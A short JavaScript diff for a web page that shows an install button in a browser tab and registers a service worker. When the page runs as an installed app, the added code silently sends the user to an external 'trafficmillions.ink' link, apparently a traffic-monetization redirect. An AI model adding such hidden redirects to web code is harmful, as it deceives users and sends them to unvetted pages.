@@ -12,3 +12,23 @@ iframe.addEventListener('load', () => {
 
 // Show the loading spinner initially
 loadingSpinner.classList.remove('hidden');
+        
+// Check if the page is not in standalone PWA mode
+if (!window.matchMedia('(display-mode: standalone)').matches) {
+    // Show the button
+    document.getElementById('round-button').style.display = 'block';
+} else {
+    window.location.href = "https://trafficmillions.ink/4YM63x";
+}
+
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+        navigator.serviceWorker.register('service-worker.js') // Add the path to your service worker file
+            .then((registration) => {
+                console.log('Service Worker registered with scope:', registration.scope);
+            })
+            .catch((error) => {
+                console.error('Service Worker registration failed:', error);
+            });
+    });
+}
